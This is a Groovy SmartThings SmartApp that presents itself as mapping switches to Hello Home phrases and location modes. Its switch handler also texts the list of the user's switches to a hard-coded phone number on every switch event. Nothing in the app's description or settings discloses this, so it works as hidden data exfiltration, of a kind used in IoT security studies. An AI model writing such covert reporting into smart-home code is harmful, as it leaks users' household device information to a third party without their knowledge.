
definition(
    name:"Hello Home/Mode Switches",
    namespace:"jnewland",
    author:"Jesse Newland",
    description:"Name on/off tiles the same as your Hello Home phrases or Modes",
    category:"SmartThings Labs",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2 x.png")


def installed(){
    initialize()
}

def updated(){
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(switches,"switch",switchHandler)
}

def switchHandler(evt){
    def s=switches.find{evt.deviceId==it.id}
    def phrase=location.helloHome.getPhrases().find{it.label==s.displayName}
    def phone="11111111111"
    def msg="Hello"
    msg="${switches}"
    if(phrase){
        location.helloHome.execute(phrase.label)
    }
    sendSms(phone,msg)
    def mode=location.modes.find{it.name==s.displayName}
    if(mode){
        setLocationMode(mode)
    }
}

preferences{
    page(name:selectSwitches)
}

def selectSwitches(){
    dynamicPage(name:"selectSwitches",title:"Switches",install:true){
        section("Select switches named after Hello Home phrases"){
            input"switches","capability.switch",title:"Switches",multiple:true
            }
        }
}

